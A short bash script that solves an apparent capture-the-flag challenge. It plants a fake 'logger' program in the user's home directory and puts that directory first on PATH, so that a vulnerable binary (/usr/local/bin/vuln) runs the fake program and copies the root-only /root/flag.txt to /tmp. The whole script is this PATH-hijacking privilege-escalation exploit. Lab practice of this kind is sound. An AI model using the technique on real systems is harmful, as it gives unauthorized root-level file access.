#!/usr/bin/env bash
set -euo pipefail
CONTAINER="challenge10"

docker exec -u ctfuser "$CONTAINER" bash -lc '
cat > ~/logger << "SH"
#!/bin/sh
cat /root/flag.txt > /tmp/flag.out
SH
chmod +x ~/logger
export PATH="$HOME:$PATH"
command -v logger
/usr/local/bin/vuln
cat /tmp/flag.out
'

docker exec -u ctfuser "$CONTAINER" bash -lc '
export PATH="$HOME:$PATH"
# Show which logger will be used (should point to ~/logger)
command -v logger
/usr/local/bin/vuln
cat /tmp/flag.out
'
